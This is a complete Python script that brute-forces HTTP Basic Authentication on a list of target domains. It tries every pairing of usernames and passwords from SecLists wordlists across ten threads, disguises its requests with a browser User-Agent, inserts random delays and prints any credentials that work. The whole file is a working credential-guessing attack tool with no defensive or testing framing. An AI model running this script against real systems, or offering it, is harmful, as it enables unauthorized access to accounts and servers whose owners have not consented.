#!/usr/bin/env python3
import requests
from requests.auth import HTTPBasicAuth
import time
import random
from concurrent.futures import ThreadPoolExecutor, as_completed

# === CONFIGURATION ===
domains_file = "domains.txt"      # file with target domains, one per line
usernames_file = "/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
passwords_file = "/usr/share/seclists/Passwords/2023-200_most_used_passwords.txt"

# Optional headers
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
}

# === LOAD FILES ===
with open(domains_file) as f:
    domains = [line.strip() for line in f if line.strip()]

with open(usernames_file) as f:
    usernames = [line.strip() for line in f if line.strip()]

with open(passwords_file) as f:
    passwords = [line.strip() for line in f if line.strip()]

# === FUNCTION TO TEST CREDENTIAL ===
def test_credentials(domain, username, password):
    try:
        response = requests.get(
            domain,
            headers=headers,
            auth=HTTPBasicAuth(username, password),
            timeout=10,
            allow_redirects=True
        )
        if response.status_code == 200:
            print(f"[SUCCESS] {domain} -> {username}:{password}")
            return (domain, username, password, True)
        else:
            print(f"[FAIL] {domain} -> {username}:{password} ({response.status_code})")
    except requests.RequestException as e:
        print(f"[ERROR] {domain} -> {username}:{password} ({e})")
    time.sleep(random.uniform(0.1, 0.5))  # small delay
    return (domain, username, password, False)

# === MULTITHREADING ===
max_threads = 10  # adjust based on your network / CPU

with ThreadPoolExecutor(max_workers=max_threads) as executor:
    futures = []
    for domain in domains:
        for username in usernames:
            for password in passwords:
                futures.append(executor.submit(test_credentials, domain, username, password))

    # Wait for all to complete
    for future in as_completed(futures):
        domain, username, password, success = future.result()
        if success:
            # optionally stop trying other passwords for this username/domain combo
            pass
